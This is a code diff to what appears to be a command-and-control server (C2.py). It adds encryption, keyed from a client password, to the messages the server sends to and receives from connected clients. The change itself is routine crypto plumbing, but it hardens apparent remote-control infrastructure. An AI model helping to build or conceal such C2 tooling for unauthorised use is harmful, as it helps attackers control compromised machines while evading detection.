@@ -20,11 +20,13 @@ try:
     from .commands import CmdContext, command_registry  # package mode (tests)
     from .auth import check_api_key, check_client_password
     from .protocol import decode_message, encode_message, recv_exactly
+    from .crypto import derive_key, encrypt, decrypt
     from .console import console as _console  # package mode (tests)
 except ImportError:  # script mode (python C2/C2.py)
     from commands import CmdContext, command_registry
     from auth import check_api_key, check_client_password
     from protocol import decode_message, encode_message, recv_exactly
+    from crypto import derive_key, encrypt, decrypt
     from console import console as _console
 
 version = 11.7 #7/3/2026
@@ -285,9 +287,9 @@ class ClientManager:
             return client_id in self.clients and self.clients[client_id]['active']
 
     def _send_message(self, conn, data):
-        """Send data with length prefix"""
+        """Send data with length prefix (payload encrypted)"""
         try:
-            length_packet, payload = encode_message(data)
+            length_packet, payload = encode_message(encrypt(derive_key(CLIENT_PASSWORD), data))
             conn.sendall(length_packet)
             conn.sendall(payload)
             return True
@@ -297,7 +299,10 @@ class ClientManager:
 
     def _recv_message(self, conn):
         try:
-            return decode_message(lambda n: self._recv_exactly(conn, n))
+            payload = decode_message(lambda n: self._recv_exactly(conn, n))
+            if payload is None:
+                return None
+            return decrypt(derive_key(CLIENT_PASSWORD), payload)
         except Exception:
             return None
 
